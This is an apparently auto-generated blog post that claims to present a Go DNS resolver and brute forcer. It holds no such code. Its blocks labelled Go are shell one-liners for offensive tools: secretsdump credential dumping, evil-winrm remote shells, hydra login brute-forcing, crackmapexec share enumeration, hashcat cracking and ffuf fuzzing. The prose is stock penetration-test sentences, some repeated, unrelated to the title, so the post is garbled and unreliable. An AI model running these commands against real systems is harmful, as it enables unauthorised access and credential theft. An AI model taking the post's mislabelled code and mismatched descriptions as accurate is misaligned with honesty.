---
TitleSEO: "DNS Resolver and Brute Forcer in Go | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Go"
Author: "ZureFX"
Description: "A Go script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "c, script, tool, go, automation, rust"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-953.html"
URL_IMAGES: ""
Date: "2024-12-15"
Tags: "C, Script, Tool, Go, Automation, Rust"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-953"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-953.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `nikto`
- `lookupsid`
- `msfvenom`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.22.76.146
evil-winrm -i 10.77.72.164 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.188.162 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.118.73.164 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

### Helper Functions

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.112.36 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.124.222.212 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.18.43.2/FUZZ
evil-winrm -i 10.21.209.236 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.78.106.135
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 7.41s
```
